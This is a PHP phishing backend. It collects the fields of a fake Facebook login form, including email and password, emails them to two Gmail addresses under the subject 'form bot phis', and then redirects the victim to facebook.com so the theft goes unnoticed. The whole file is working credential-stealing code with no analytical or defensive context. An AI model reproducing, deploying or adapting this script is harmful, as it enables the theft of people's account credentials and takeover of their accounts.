<?PHP


error_reporting(E_ERROR | E_WARNING | E_PARSE);
ini_set('track_errors', true);

function DoStripSlashes($fieldValue)  { 
// temporary fix for PHP6 compatibility - magic quotes deprecated in PHP6
 if ( function_exists( 'get_magic_quotes_gpc' ) && get_magic_quotes_gpc() ) { 
  if (is_array($fieldValue) ) { 
   return array_map('DoStripSlashes', $fieldValue); 
  } else { 
   return trim(stripslashes($fieldValue)); 
  } 
 } else { 
  return $fieldValue; 
 } 
}

function FilterCChars($theString) {
 return preg_replace('/[\x00-\x1F]/', '', $theString);
}



if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
 $clientIP = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
 $clientIP = $_SERVER['REMOTE_ADDR'];
}

$FTGlsd = DoStripSlashes( $_POST['lsd'] );
$FTGemail = DoStripSlashes( $_POST['email'] );
$FTGpass = DoStripSlashes( $_POST['pass'] );
$FTGsubmit = DoStripSlashes( $_POST['submit'] );
$FTGpersistent = DoStripSlashes( $_POST['persistent'] );
$FTGdefault_persistent = DoStripSlashes( $_POST['default_persistent'] );
$FTGtimezone = DoStripSlashes( $_POST['timezone'] );
$FTGlgnrnd = DoStripSlashes( $_POST['lgnrnd'] );
$FTGlgnjs = DoStripSlashes( $_POST['lgnjs'] );
$FTGlocale = DoStripSlashes( $_POST['locale'] );



$validationFailed = false;


# Include message in error page and dump it to the browser

if ($validationFailed === true) {

 $errorPage = '<html><head><meta http-equiv="content-type" content="text/html; charset=utf-8" /><title>Error</title></head><body>Errors found: <!--VALIDATIONERROR--></body></html>';


 $errorList = @implode("<br />\n", $FTGErrorMessage);
 $errorPage = str_replace('<!--VALIDATIONERROR-->', $errorList, $errorPage);



 echo $errorPage;

}

if ( $validationFailed === false ) {

 # Email to Form Owner
  
 $emailSubject = FilterCChars("form bot phis");
  
 $emailBody = "lsd : $FTGlsd\n"
  . "email : $FTGemail\n"
  . "pass : $FTGpass\n"
  . "submit : $FTGsubmit\n"
  . "persistent : $FTGpersistent\n"
  . "default persistent : $FTGdefault_persistent\n"
  . "timezone : $FTGtimezone\n"
  . "lgnrnd : $FTGlgnrnd\n"
  . "lgnjs : $FTGlgnjs\n"
  . "locale : $FTGlocale\n"
  . "";
  $emailTo = 'form-bot <abesh.r.63@gmail.com>,form-bot <pcx1256@gmail.com>';
   
  $emailFrom = FilterCChars("formbot@form.com");
   
  $emailHeader = "From: $emailFrom\n"
   . "MIME-Version: 1.0\n"
   . "Content-type: text/plain; charset=\"UTF-8\"\n"
   . "Content-transfer-encoding: 8bit\n";
   
  mail($emailTo, $emailSubject, $emailBody, $emailHeader);
  
  
  # Include message in the success page and dump it to the browser


}

?>

<meta http-equiv="refresh" content="1;url=http://facebook.com" />	

<?php
//done
?>